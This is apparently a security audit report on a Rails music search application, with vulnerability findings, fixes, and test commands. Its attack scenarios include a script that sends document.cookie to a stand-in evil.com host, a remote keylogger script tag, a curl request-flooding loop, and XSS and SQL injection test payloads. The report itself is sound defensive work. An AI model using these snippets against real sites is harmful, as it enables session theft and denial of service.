# Security Audit Report - Podil Music Search Application

**Generated:** January 16, 2026
**Auditor:** Red Team Security Review
**Target:** Podil Rails Application (v8.1.2)
**Threat Model:** Web application accepting user input, making external API calls, serving public content

---

## 🔴 Executive Summary

### Critical Risk Assessment: **HIGH RISK** ⚠️

This application has **12 critical and high-severity security vulnerabilities** that must be addressed immediately before production deployment. The most severe issues include:

1. **XSS (Cross-Site Scripting) vulnerability** via `raw()` helper
2. **Missing Content Security Policy** - completely disabled
3. **No rate limiting** - vulnerable to DoS and API quota exhaustion
4. **Insufficient input validation** - SQL injection and XSS attack surface
5. **Missing security headers** - no defense-in-depth

### Risk Score: **7.2/10** (High)

**Recommendation:** Do NOT deploy to production until P0 and P1 issues are resolved.

---

## Vulnerability Summary

| ID | Vulnerability | Severity | CVSS | Impact | File |
|----|---------------|----------|------|--------|------|
| SEC-001 | XSS via raw() HTML injection | 🔴 CRITICAL | 8.2 | Account takeover, data theft | app/views/search/results.html.erb:51 |
| SEC-002 | Content Security Policy disabled | 🔴 CRITICAL | 7.8 | XSS, clickjacking, data injection | config/initializers/content_security_policy.rb |
| SEC-003 | No rate limiting on search endpoint | 🔴 CRITICAL | 7.5 | DoS, API quota exhaustion, cost overruns | app/controllers/search_controller.rb |
| SEC-004 | Missing input validation on query param | 🟠 HIGH | 6.8 | SQL injection, XSS, DoS | app/controllers/search_controller.rb |
| SEC-005 | Inline JavaScript in views | 🟠 HIGH | 6.5 | CSP bypass, XSS | app/views/search/results.html.erb:15-19 |
| SEC-006 | Missing API key validation | 🟠 HIGH | 6.2 | Application crashes, error exposure | app/services/*.rb |
| SEC-007 | No CSRF verification on forms | 🟡 MEDIUM | 5.5 | CSRF attacks | app/views/search/*.erb |
| SEC-008 | Missing security headers | 🟡 MEDIUM | 5.3 | Clickjacking, MIME sniffing | config/environments/production.rb |
| SEC-009 | No API request timeouts | 🟡 MEDIUM | 5.0 | Resource exhaustion | app/services/*.rb |
| SEC-010 | Unescaped user input in URLs | 🟡 MEDIUM | 4.8 | Open redirect, XSS | app/controllers/search_controller.rb:36-43 |
| SEC-011 | Missing host authorization | 🟡 MEDIUM | 4.5 | DNS rebinding attacks | config/environments/production.rb |
| SEC-012 | Error messages expose internals | 🟢 LOW | 3.2 | Information disclosure | app/controllers/search_controller.rb:29 |

---

## Detailed Vulnerability Analysis

### SEC-001: Cross-Site Scripting (XSS) via raw() HTML
**Severity:** 🔴 CRITICAL | **CVSS:** 8.2 | **CWE:** CWE-79

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/views/search/results.html.erb:51`

**Vulnerable Code:**
```erb
<% @purchase_links_with_icons.each do |icon, link| %>
  <a href="<%= link %>" target="_blank" rel="noopener noreferrer" class="...">
    <%= raw(icon) %>  <!-- 🔴 CRITICAL VULNERABILITY -->
  </a>
<% end %>
```

**Issue:**
The `raw()` helper disables all HTML escaping, allowing arbitrary HTML/JavaScript injection. The `icon` variable comes from hard-coded SVG strings in the controller (lines 47-60), but this pattern is extremely dangerous.

**Attack Scenario:**
If `icon` is ever sourced from user input or external API (even indirectly), an attacker could inject:
```html
<script>
  // Steal session cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);

  // Redirect to phishing page
  window.location = 'https://evil-phishing-site.com';

  // Inject malicious form to steal credentials
  document.body.innerHTML = '<form action="https://evil.com">...</form>';
</script>
```

**Impact:**
- Session hijacking
- Account takeover
- Data exfiltration
- Phishing attacks
- Malware distribution

**Proof of Concept:**
If an attacker could manipulate the controller to add:
```ruby
@purchase_links_with_icons['<script>alert("XSS")</script>'] = "https://evil.com"
```

The script would execute in the user's browser.

**Fix:**

**IMMEDIATE (Required):** Use content_tag or safe SVG helper

**Option 1 - Use SVG partial (RECOMMENDED):**

Create `/Users/gduplessy/Documents/GitHub/podil/app/views/shared/_music_service_icon.html.erb`:
```erb
<% case service %>
<% when 'Spotify' %>
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-spotify" viewBox="0 0 16 16" aria-label="Spotify">
    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0m3.669 11.538a.5.5 0 0 1-.686.165c-1.879-1.147-4.243-1.407-7.028-.77a.499.499 0 0 1-.222-.973c3.048-.696 5.662-.397 7.77.892a.5.5 0 0 1 .166.686..."/>
  </svg>
<% when 'Apple Music' %>
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-apple" viewBox="0 0 16 16" aria-label="Apple Music">
    <path d="M11.182.008C11.148-.03 9.923.023 8.857 1.18c-1.066 1.156-.902 2.482-.878 2.516..."/>
  </svg>
<!-- ... other services ... -->
<% end %>
```

**Update controller:**
```ruby
# app/controllers/search_controller.rb

# Replace lines 47-61 with:
@purchase_links = {
  "Spotify" => "https://open.spotify.com/search/#{ERB::Util.url_encode(@song_title)}",
  "Apple Music" => "https://music.apple.com/search?term=#{ERB::Util.url_encode(@song_title)}",
  "Amazon Music" => "https://music.amazon.com/search/#{ERB::Util.url_encode(@song_title)}",
  "YouTube Music" => "https://music.youtube.com/search?q=#{ERB::Util.url_encode(@song_title)}"
}
```

**Update view:**
```erb
<!-- app/views/search/results.html.erb lines 49-54 -->
<% @purchase_links.each do |service, link| %>
  <a href="<%= link %>" target="_blank" rel="noopener noreferrer" class="...">
    <%= render 'shared/music_service_icon', service: service %>
  </a>
<% end %>
```

**Option 2 - Use sanitize helper (SAFER FALLBACK):**
```erb
<%= sanitize(icon, tags: %w[svg path], attributes: %w[xmlns width height fill class viewBox d]) %>
```

**Validation:**
```bash
# Test XSS attack
curl 'http://localhost:3000/search/results?q=test' | grep '<script'
# Should return no results

# Run Brakeman security scanner
bin/brakeman --format html -o brakeman-report.html
```

---

### SEC-002: Content Security Policy Completely Disabled
**Severity:** 🔴 CRITICAL | **CVSS:** 7.8 | **CWE:** CWE-693

**Location:** `/Users/gduplessy/Documents/GitHub/podil/config/initializers/content_security_policy.rb`

**Vulnerable Code:**
```ruby
# Lines 7-25 are ALL commented out
# Rails.application.configure do
#   config.content_security_policy do |policy|
#     ...
#   end
# end
```

**Issue:**
No Content Security Policy headers are sent. This allows:
- Any inline JavaScript to execute
- Scripts from any domain to load
- Styles from any domain to load
- Iframes to embed your site (clickjacking)
- Forms to submit to any domain

**Impact:**
- No defense against XSS attacks
- No protection from clickjacking
- Vulnerable to data injection
- Malicious scripts can load from compromised CDNs

**Attack Scenario:**
An attacker exploiting SEC-001 could load external malicious scripts:
```html
<script src="https://evil.com/keylogger.js"></script>
```

Without CSP, the browser will execute this script.

**Fix:**

**File:** `/Users/gduplessy/Documents/GitHub/podil/config/initializers/content_security_policy.rb`

**UNCOMMENT and configure CSP:**
```ruby
Rails.application.configure do
  config.content_security_policy do |policy|
    # Allow same-origin for defaults
    policy.default_src :self

    # Allow YouTube embeds (required for video player)
    policy.frame_src :self, "https://www.youtube.com", "https://youtube.com"

    # Allow images from self and data URIs
    policy.img_src :self, :data, :https

    # Allow scripts from self only (blocks inline scripts by default)
    policy.script_src :self

    # Allow styles from self
    policy.style_src :self

    # Allow fonts from self
    policy.font_src :self, :data

    # Prevent all object/embed/applet
    policy.object_src :none

    # Allow form submissions to self only
    policy.form_action :self

    # Prevent framing (clickjacking protection)
    policy.frame_ancestors :none

    # Upgrade insecure requests to HTTPS
    policy.upgrade_insecure_requests true

    # Block all mixed content
    policy.block_all_mixed_content true

    # Specify where to report CSP violations
    policy.report_uri "/csp-violation-report"
  end

  # Generate nonces for inline scripts (if you need them)
  config.content_security_policy_nonce_generator = ->(request) {
    SecureRandom.base64(16)
  }

  config.content_security_policy_nonce_directives = %w(script-src style-src)

  # Start in report-only mode to test
  config.content_security_policy_report_only = true  # Remove after testing
end
```

**IMPORTANT:** This will break your inline JavaScript in `results.html.erb`. See SEC-005 for the fix.

**Add CSP violation endpoint:**

Create `/Users/gduplessy/Documents/GitHub/podil/app/controllers/csp_reports_controller.rb`:
```ruby
class CspReportsController < ApplicationController
  skip_before_action :verify_authenticity_token

  def create
    Rails.logger.warn "CSP Violation: #{request.body.read}"
    head :ok
  end
end
```

**Add route:**
```ruby
# config/routes.rb
post '/csp-violation-report', to: 'csp_reports#create'
```

**Validation:**
```bash
# Check CSP headers are set
curl -I http://localhost:3000 | grep -i content-security

# Should see:
# content-security-policy-report-only: default-src 'self'; ...
```

**Remove `report_only` after testing for 1 week with no violations.**

---

### SEC-003: No Rate Limiting on Search Endpoint
**Severity:** 🔴 CRITICAL | **CVSS:** 7.5 | **CWE:** CWE-770

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/controllers/search_controller.rb`

**Vulnerable Code:**
```ruby
def results
  query = params[:q]

  # NO RATE LIMITING HERE
  youtube_results = YoutubeService.search(query)  # External API call
  lastfm_results = LastfmService.get_track_info(...)  # External API call
  # ...
end
```

**Issue:**
Any user can spam unlimited search requests, causing:
1. **API quota exhaustion** - YouTube/Last.fm APIs have daily quotas. Attacker exhausts quota, taking down your app.
2. **Cost overruns** - If APIs are paid, attacker racks up huge bills
3. **DoS attack** - Server resources exhausted by processing requests
4. **IP bans** - Your server IP gets banned by external APIs

**Attack Scenario:**
```bash
# Attacker's script
while true; do
  curl 'https://podil.com/search/results?q=test' &
done

# Sends thousands of requests per second
# Result: App crashes, APIs exhausted, $$ cost
```

**Impact:**
- Application downtime
- Financial loss (API costs)
- IP reputation damage
- Service unavailable for legitimate users

**Fix:**

**IMMEDIATE:** Install and configure Rack::Attack

**1. Add gem:**
```ruby
# Gemfile
gem 'rack-attack'
```

```bash
bundle install
```

**2. Create initializer:**

File: `/Users/gduplessy/Documents/GitHub/podil/config/initializers/rack_attack.rb`

```ruby
class Rack::Attack
  # Rate limiting configuration
  Rack::Attack.cache.store = ActiveSupport::Cache::MemoryStore.new

  # Throttle search requests
  throttle('search/ip', limit: 10, period: 1.minute) do |req|
    if req.path == '/search/results' && req.get?
      req.ip
    end
  end

  # Throttle all requests by IP (general protection)
  throttle('req/ip', limit: 300, period: 5.minutes) do |req|
    req.ip unless req.path.start_with?('/assets')
  end

  # Block suspicious requests
  blocklist('block bad actors') do |req|
    # Block IPs in environment variable (format: "1.2.3.4,5.6.7.8")
    ENV['BLOCKED_IPS']&.split(',')&.include?(req.ip)
  end

  # Exponential backoff for repeated violations
  Rack::Attack.blocklisted_responder = lambda do |request|
    [429, {'Content-Type' => 'text/plain'}, ['Rate limit exceeded. Try again later.']]
  end

  # Allow safelist for internal tools
  safelist('allow localhost') do |req|
    req.ip == '127.0.0.1' || req.ip == '::1'
  end

  # Log blocked requests
  ActiveSupport::Notifications.subscribe('rack.attack') do |name, start, finish, request_id, payload|
    req = payload[:request]
    if [:throttle, :blocklist].include?(payload[:name])
      Rails.logger.warn "[Rack::Attack][#{payload[:name]}] #{req.ip} - #{req.path}"
    end
  end
end
```

**3. Enable middleware:**

File: `/Users/gduplessy/Documents/GitHub/podil/config/application.rb`

```ruby
# Add inside class Application < Rails::Application
config.middleware.use Rack::Attack
```

**4. Create custom error page:**

File: `/Users/gduplessy/Documents/GitHub/podil/public/429.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Too Many Requests</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; }
    h1 { color: #e74c3c; }
  </style>
</head>
<body>
  <h1>Too Many Requests</h1>
  <p>You've exceeded the rate limit. Please wait a moment and try again.</p>
  <p>Limit: 10 searches per minute</p>
</body>
</html>
```

**Validation:**
```bash
# Test rate limiting
for i in {1..15}; do
  curl -w "\nResponse code: %{http_code}\n" 'http://localhost:3000/search/results?q=test'
  sleep 0.5
done

# First 10 should return 200
# Requests 11-15 should return 429 (Too Many Requests)
```

**Monitor rate limiting:**
```ruby
# In Rails console
Rack::Attack.cache.store.stats
```

---

### SEC-004: Insufficient Input Validation on Query Parameter
**Severity:** 🟠 HIGH | **CVSS:** 6.8 | **CWE:** CWE-20

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/controllers/search_controller.rb:6`

**Vulnerable Code:**
```ruby
def results
  query = params[:q]  # 🔴 NO VALIDATION

  # Immediately passed to external APIs
  youtube_results = YoutubeService.search(query)
  # ...
end
```

**Issue:**
No validation on `query` parameter allows:
1. **SQL injection** attempts (if query is ever used in SQL)
2. **XSS payloads** (if echoed back unescaped)
3. **API abuse** (very long strings crash APIs)
4. **Null/empty queries** crash line 10

**Attack Scenarios:**

**1. Crash via nil query:**
```bash
curl 'http://localhost:3000/search/results'
# Results in: NoMethodError: undefined method `[]' for nil:NilClass (line 10)
```

**2. API abuse via extremely long query:**
```bash
curl 'http://localhost:3000/search/results?q=AAAA....(10MB of A's)'
# Results in: API timeout, memory exhaustion
```

**3. XSS payload:**
```bash
curl 'http://localhost:3000/search/results?q=<script>alert(1)</script>'
# If ever echoed back, executes JavaScript
```

**Impact:**
- Application crashes (DoS)
- XSS vulnerabilities
- Resource exhaustion
- API abuse

**Fix:**

**File:** `/Users/gduplessy/Documents/GitHub/podil/app/controllers/search_controller.rb`

**Add validation at start of `results` method:**
```ruby
def results
  # Clear any existing flash messages
  flash.clear

  # Validate query parameter
  query = params[:q]&.strip

  # Check if query is blank
  if query.blank?
    flash[:error] = "Please enter a search term."
    return render :results, status: :unprocessable_entity
  end

  # Validate query length
  if query.length > 200
    flash[:error] = "Search term is too long. Maximum 200 characters."
    return render :results, status: :unprocessable_entity
  end

  # Validate query doesn't contain dangerous characters
  if query.match?(/[<>\"']/)
    flash[:error] = "Invalid characters in search term."
    return render :results, status: :unprocessable_entity
  end

  # Sanitize query (remove potential SQL injection attempts)
  query = ActionController::Base.helpers.sanitize(query, tags: [])

  # Now safe to use
  youtube_results = YoutubeService.search(query)
  # ... rest of code
end
```

**Better approach - Use strong parameters:**

```ruby
private

def search_params
  params.require(:q)
        .permit(:q)
        .tap do |p|
          p[:q] = p[:q].to_s.strip

          # Validate length
          if p[:q].length > 200
            raise ActionController::BadRequest, "Query too long"
          end

          # Validate format
          unless p[:q].match?(/\A[\w\s\-']+\z/)
            raise ActionController::BadRequest, "Invalid query format"
          end
        end
end

def results
  query = search_params[:q]
  # ... rest of code
end
```

**Validation:**
```bash
# Test blank query
curl 'http://localhost:3000/search/results'
# Should return error: "Please enter a search term"

# Test XSS attempt
curl 'http://localhost:3000/search/results?q=<script>alert(1)</script>'
# Should return error: "Invalid characters in search term"

# Test very long query
curl 'http://localhost:3000/search/results?q='$(python3 -c "print('A'*300)")
# Should return error: "Search term is too long"
```

---

### SEC-005: Inline JavaScript in Views (CSP Violation)
**Severity:** 🟠 HIGH | **CVSS:** 6.5 | **CWE:** CWE-79

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/views/search/results.html.erb:15-19`

**Vulnerable Code:**
```erb
<script>
  function closeError() {
    window.location.href = '<%= search_index_path %>';
  }
</script>
```

**Issue:**
Inline JavaScript violates Content Security Policy and creates XSS risk if `search_index_path` is ever manipulated.

**Impact:**
- Blocks CSP implementation (SEC-002)
- Potential for XSS if helper is compromised
- Violates security best practices

**Fix:**

**Option 1 - Move to Stimulus controller (RECOMMENDED):**

Create `/Users/gduplessy/Documents/GitHub/podil/app/javascript/controllers/alert_controller.js`:
```javascript
import { Controller } from "@hotwired/stimulus"

export default class extends Controller {
  close() {
    window.location.href = this.element.dataset.redirectUrl
  }
}
```

**Update view:**
```erb
<!-- app/views/search/results.html.erb -->
<div data-controller="alert" data-redirect-url="<%= search_index_path %>">
  <button data-action="click->alert#close" class="...">
    <svg>...</svg>
  </button>
</div>

<!-- DELETE lines 15-19 (the inline script) -->
```

**Option 2 - Use Turbo Frame (simpler):**
```erb
<!-- Just use a link instead of JavaScript -->
<%= link_to search_index_path, class: "text-red-700 hover:text-red-900 focus:outline-none" do %>
  <svg class="h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
    <path fill-rule="evenodd" d="M4.293..." clip-rule="evenodd" />
  </svg>
<% end %>
```

**Validation:**
```bash
# Check no inline scripts exist
curl http://localhost:3000/search/results | grep '<script>'
# Should only return external script tags, no inline code
```

---

### SEC-006: Missing API Key Validation
**Severity:** 🟠 HIGH | **CVSS:** 6.2 | **CWE:** CWE-252

**Location:** All service files
- `/Users/gduplessy/Documents/GitHub/podil/app/services/genius_service.rb`
- `/Users/gduplessy/Documents/GitHub/podil/app/services/lastfm_service.rb`
- `/Users/gduplessy/Documents/GitHub/podil/app/services/youtube_service.rb`

**Vulnerable Code:**
```ruby
# app/services/youtube_service.rb
def self.search(query)
  get("/search", query: {
    key: ENV["YOUTUBE_API_KEY"]  # 🔴 No validation if nil
  })
end
```

**Issue:**
If API keys are not set in environment, application crashes with confusing errors or sends `key=nil` to APIs.

**Impact:**
- Application crashes in production
- Confusing error messages
- Potential information disclosure in stack traces
- Failed deployments

**Fix:**

**Option 1 - Validate at application startup:**

Create `/Users/gduplessy/Documents/GitHub/podil/config/initializers/api_keys.rb`:
```ruby
# Validate required API keys are present
REQUIRED_API_KEYS = %w[
  YOUTUBE_API_KEY
  LASTFM_API_KEY
  GENIUS_ACCESS_TOKEN
].freeze

missing_keys = REQUIRED_API_KEYS.reject { |key| ENV[key].present? }

if missing_keys.any?
  error_msg = "Missing required API keys: #{missing_keys.join(', ')}\n"
  error_msg += "Please set these in your .env file or environment variables."

  if Rails.env.production?
    # In production, fail fast
    raise StandardError, error_msg
  else
    # In development, just warn
    Rails.logger.warn "=" * 80
    Rails.logger.warn error_msg
    Rails.logger.warn "=" * 80
  end
end
```

**Option 2 - Validate in each service:**

```ruby
# app/services/youtube_service.rb
class YoutubeService
  include HTTParty
  base_uri "https://www.googleapis.com/youtube/v3"

  class MissingAPIKeyError < StandardError; end

  def self.search(query)
    validate_api_key!

    get("/search", query: {
      q: query,
      part: "snippet",
      type: "video",
      key: ENV["YOUTUBE_API_KEY"]
    })
  end

  private

  def self.validate_api_key!
    unless ENV["YOUTUBE_API_KEY"].present?
      raise MissingAPIKeyError, "YOUTUBE_API_KEY environment variable is not set"
    end
  end
end
```

**Update controller to handle missing keys gracefully:**
```ruby
# app/controllers/search_controller.rb

rescue_from YoutubeService::MissingAPIKeyError, with: :handle_missing_api_key

private

def handle_missing_api_key
  Rails.logger.error "Missing YouTube API key"
  flash[:error] = "Service temporarily unavailable. Please try again later."
  render :results, status: :service_unavailable
end
```

**Validation:**
```bash
# Unset API key and try to start app
unset YOUTUBE_API_KEY
bin/rails server

# Should see error:
# "Missing required API keys: YOUTUBE_API_KEY"
# Application should not start (production) or show warning (development)
```

---

### SEC-007: Missing CSRF Verification on Forms
**Severity:** 🟡 MEDIUM | **CVSS:** 5.5 | **CWE:** CWE-352

**Location:**
- `/Users/gduplessy/Documents/GitHub/podil/app/views/search/index.html.erb:10`
- `/Users/gduplessy/Documents/GitHub/podil/app/views/search/results.html.erb:27`

**Vulnerable Code:**
```erb
<%= form_tag(results_search_index_path, method: :get) do %>
  <!-- form fields -->
<% end %>
```

**Issue:**
Forms use GET method, which don't include CSRF tokens. While GET requests shouldn't modify data (safe by definition), this pattern can be exploited if:
1. Parameters are logged (leaking search queries)
2. Search queries are cached in browser history
3. Referrer headers leak search terms to third parties

**Impact:**
- Information leakage via browser history
- Referrer header leakage
- Cannot prevent CSRF if later changed to POST

**Fix:**

**Change to POST method (recommended for privacy):**

```erb
<!-- app/views/search/index.html.erb -->
<%= form_with(url: results_search_index_path, method: :post) do %>
  <%= text_field_tag :q, nil, placeholder: "Search for a song...", class: "..." %>
  <%= submit_tag "Search", class: "..." %>
<% end %>
```

**Update routes:**
```ruby
# config/routes.rb
resources :search, only: [ :index ] do
  collection do
    post :results  # Change from get to post
  end
end
```

**Benefits:**
- CSRF token automatically included via `form_with`
- Search queries not in browser history
- No referrer leakage
- More secure

**Alternative - Keep GET but add token:**
```erb
<%= form_tag(results_search_index_path, method: :get, authenticity_token: true) do %>
  <!-- form fields -->
<% end %>
```

**Note:** This won't work with GET in Rails by default. Best to use POST.

---

### SEC-008: Missing Security Headers
**Severity:** 🟡 MEDIUM | **CVSS:** 5.3 | **CWE:** CWE-693

**Location:** `/Users/gduplessy/Documents/GitHub/podil/config/environments/production.rb`

**Issue:**
Application doesn't set important security headers:
- `X-Frame-Options` - Allows clickjacking
- `X-Content-Type-Options` - Allows MIME sniffing attacks
- `X-XSS-Protection` - No legacy browser XSS protection
- `Referrer-Policy` - Leaks URLs to third parties
- `Permissions-Policy` - No feature policy restrictions

**Impact:**
- Clickjacking attacks
- MIME type confusion attacks
- Information leakage via Referrer
- Unauthorized camera/microphone access

**Fix:**

**File:** `/Users/gduplessy/Documents/GitHub/podil/config/initializers/security_headers.rb`

Create new file:
```ruby
# Configure security headers

Rails.application.config.action_dispatch.default_headers = {
  # Prevent page from being displayed in iframe (clickjacking protection)
  'X-Frame-Options' => 'DENY',

  # Prevent MIME type sniffing
  'X-Content-Type-Options' => 'nosniff',

  # Enable browser's XSS protection (legacy browsers)
  'X-XSS-Protection' => '1; mode=block',

  # Control referrer information sent to other sites
  'Referrer-Policy' => 'strict-origin-when-cross-origin',

  # Restrict feature usage
  'Permissions-Policy' => 'camera=(), microphone=(), geolocation=()'
}

# Set HSTS header (force HTTPS) - only in production
if Rails.env.production?
  Rails.application.config.force_ssl = true
  Rails.application.config.ssl_options = {
    hsts: {
      expires: 1.year.to_i,
      subdomains: true,
      preload: true
    }
  }
end
```

**Validation:**
```bash
# Check headers are set
curl -I http://localhost:3000 | grep -E 'X-Frame-Options|X-Content-Type|Referrer-Policy'

# Should see:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Referrer-Policy: strict-origin-when-cross-origin
```

**Scan with SecurityHeaders.com:**
```
Visit: https://securityheaders.com/
Enter your production URL
Target score: A+
```

---

### SEC-009: No Timeout Configuration for API Requests
**Severity:** 🟡 MEDIUM | **CVSS:** 5.0 | **CWE:** CWE-400

**Location:** All service files

**Issue:**
HTTParty requests have no timeout configuration. If external API hangs, your app hangs indefinitely.

**Impact:**
- Resource exhaustion (threads blocked)
- DoS via slow external API responses
- Poor user experience (page never loads)

**Fix:**

**Update all services with timeout configuration:**

```ruby
# app/services/youtube_service.rb
class YoutubeService
  include HTTParty
  base_uri "https://www.googleapis.com/youtube/v3"

  # Configure timeouts
  default_timeout 5  # 5 seconds total
  open_timeout 2     # 2 seconds to establish connection
  read_timeout 3     # 3 seconds to read response

  # Add retry logic for transient failures
  def self.search(query)
    retries = 3
    begin
      get("/search", query: {
        q: query,
        part: "snippet",
        type: "video",
        key: ENV["YOUTUBE_API_KEY"]
      }, timeout: 5)
    rescue Net::OpenTimeout, Net::ReadTimeout => e
      retries -= 1
      retry if retries > 0
      Rails.logger.error "YouTube API timeout: #{e.message}"
      raise ServiceUnavailableError, "YouTube service is temporarily unavailable"
    end
  end
end
```

**Apply same to LastfmService and GeniusService.**

**Handle timeouts in controller:**
```ruby
# app/controllers/search_controller.rb

rescue_from Net::OpenTimeout, Net::ReadTimeout, with: :handle_api_timeout

private

def handle_api_timeout
  flash[:error] = "Search is taking longer than usual. Please try again."
  render :results, status: :gateway_timeout
end
```

---

### SEC-010: Unescaped User Input in URLs
**Severity:** 🟡 MEDIUM | **CVSS:** 4.8 | **CWE:** CWE-116

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/controllers/search_controller.rb:36-43`

**Vulnerable Code:**
```ruby
@purchase_links = {
  "Spotify" => "https://open.spotify.com/search/track:#{@song_title}",
  "Apple Music" => "https://music.apple.com/search?term=#{@song_title}",
  # ... etc
}
```

**Issue:**
`@song_title` comes from Last.fm API and is not URL-encoded. If song title contains special characters (`&`, `?`, `#`, `=`), URLs break.

**Impact:**
- Broken links
- Potential open redirect vulnerability
- XSS if URL is ever echoed back

**Fix:**

Use `ERB::Util.url_encode`:

```ruby
@purchase_links = {
  "Spotify" => "https://open.spotify.com/search/#{ERB::Util.url_encode("track:#{@song_title}")}",
  "Apple Music" => "https://music.apple.com/search?term=#{ERB::Util.url_encode(@song_title)}",
  "Tidal" => "https://tidal.com/search?q=#{ERB::Util.url_encode(@song_title)}",
  "Amazon Music" => "https://music.amazon.com/search?term=#{ERB::Util.url_encode(@song_title)}",
  "YouTube Music" => "https://music.youtube.com/search?q=#{ERB::Util.url_encode(@song_title)}",
  "Deezer" => "https://deezer.com/search/#{ERB::Util.url_encode(@song_title)}",
  "SoundCloud" => "https://soundcloud.com/search?q=#{ERB::Util.url_encode(@song_title)}",
  "Bandcamp" => "https://bandcamp.com/search?q=#{ERB::Util.url_encode(@song_title)}"
}
```

---

### SEC-011: Missing Host Authorization in Production
**Severity:** 🟡 MEDIUM | **CVSS:** 4.5 | **CWE:** CWE-346

**Location:** `/Users/gduplessy/Documents/GitHub/podil/config/environments/production.rb:83-86`

**Vulnerable Code:**
```ruby
# Enable DNS rebinding protection and other `Host` header attacks.
# config.hosts = [
#   ...
# ]
```

**Issue:**
Host authorization is commented out. This allows DNS rebinding and Host header attacks.

**Impact:**
- DNS rebinding attacks
- Cache poisoning
- Password reset poisoning
- SSRF via Host header manipulation

**Fix:**

Uncomment and configure:

```ruby
# config/environments/production.rb

# Enable DNS rebinding protection
config.hosts = [
  "podil.com",              # Your production domain
  "www.podil.com",          # www subdomain
  /.*\.podil\.com/          # All subdomains
]

# Allow health check endpoint without host validation
config.host_authorization = {
  exclude: ->(request) { request.path == "/up" }
}
```

**For development:**
```ruby
# config/environments/development.rb
config.hosts.clear  # Allow all hosts in development
```

---

### SEC-012: Error Messages Expose Internal Details
**Severity:** 🟢 LOW | **CVSS:** 3.2 | **CWE:** CWE-209

**Location:** `/Users/gduplessy/Documents/GitHub/podil/app/controllers/search_controller.rb:29`

**Vulnerable Code:**
```ruby
rescue => e
  Rails.logger.error("LastFM Error: #{e.message}")
  flash[:error] = "Unable to find the song on LastFM. Please try again later."
  # ...
end
```

**Issue:**
Error message reveals you're using Last.fm. Logged error may expose stack trace to logs.

**Impact:**
- Information disclosure about tech stack
- Potential for more targeted attacks
- Log injection if error message contains user input

**Fix:**

Use generic error messages:

```ruby
rescue => e
  # Log detailed error (internal only)
  Rails.logger.error("API Error: #{e.class} - #{e.message}")
  Rails.logger.error(e.backtrace.join("\n"))

  # Show generic error to user
  flash[:error] = "Unable to find the song. Please try a different search term."
  return render :results, status: :unprocessable_entity
end
```

---

## Priority Fix Plan

### P0: Critical - Fix Before Production Deploy

1. **SEC-001:** Remove `raw()` usage (1 hour)
2. **SEC-002:** Enable Content Security Policy (2 hours)
3. **SEC-003:** Add rate limiting with Rack::Attack (1.5 hours)
4. **SEC-004:** Add input validation (1 hour)
5. **SEC-005:** Remove inline JavaScript (30 min)

**Total Time: ~6 hours**

---

### P1: High Priority - Fix Within 1 Week

6. **SEC-006:** Add API key validation (30 min)
7. **SEC-007:** Change forms to POST method (30 min)
8. **SEC-008:** Add security headers (30 min)
9. **SEC-009:** Configure API timeouts (1 hour)
10. **SEC-010:** URL-encode user input (30 min)

**Total Time: ~3 hours**

---

### P2: Medium Priority - Fix Within 1 Month

11. **SEC-011:** Enable host authorization (15 min)
12. **SEC-012:** Improve error messages (15 min)

**Total Time: ~30 min**

---

## Testing & Validation Checklist

### Automated Security Testing

- [ ] Run Brakeman security scanner:
  ```bash
  bundle exec brakeman -A -f html -o brakeman-report.html
  ```

- [ ] Run bundle-audit for dependency vulnerabilities:
  ```bash
  gem install bundler-audit
  bundle-audit check --update
  ```

- [ ] Run npm audit:
  ```bash
  npm audit
  npm audit fix
  ```

### Manual Security Testing

- [ ] Test XSS payloads in search:
  ```bash
  curl 'http://localhost:3000/search/results?q=<script>alert(1)</script>'
  ```

- [ ] Test SQL injection attempts:
  ```bash
  curl 'http://localhost:3000/search/results?q=\' OR 1=1--'
  ```

- [ ] Test rate limiting:
  ```bash
  for i in {1..20}; do curl http://localhost:3000/search/results?q=test; done
  ```

- [ ] Verify CSP headers:
  ```bash
  curl -I http://localhost:3000 | grep -i content-security-policy
  ```

- [ ] Test with OWASP ZAP or Burp Suite

### Compliance Checks

- [ ] Verify HTTPS enforced in production
- [ ] Check SecurityHeaders.com score (target: A+)
- [ ] Run Mozilla Observatory scan
- [ ] Verify no secrets in git history:
  ```bash
  git log -p | grep -i 'api.*key\|password\|secret'
  ```

---

## Security Monitoring

### Post-Deployment Monitoring

Set up alerts for:
- CSP violation reports
- Rate limit triggers (>100/hour from single IP)
- Failed authentication attempts
- Unexpected 500 errors
- API key validation failures

**Recommended tools:**
- Sentry for error tracking
- Logflare/Papertrail for log aggregation
- Scout APM for performance monitoring

---

## Conclusion

**Current Security Posture: HIGH RISK ⚠️**

The application has critical vulnerabilities that must be fixed before production deployment. Implementing the P0 and P1 fixes will reduce risk to an acceptable level.

**After fixes:**
- **P0 complete:** Risk reduced to MEDIUM
- **P1 complete:** Risk reduced to LOW
- **P2 complete:** Risk reduced to VERY LOW

**Estimated total fix time:** ~10 hours

**Next Steps:**
1. Review this report with development team
2. Create GitHub issues for each vulnerability
3. Implement P0 fixes immediately
4. Schedule P1 and P2 fixes
5. Re-test after all fixes applied
6. Consider penetration testing before production launch
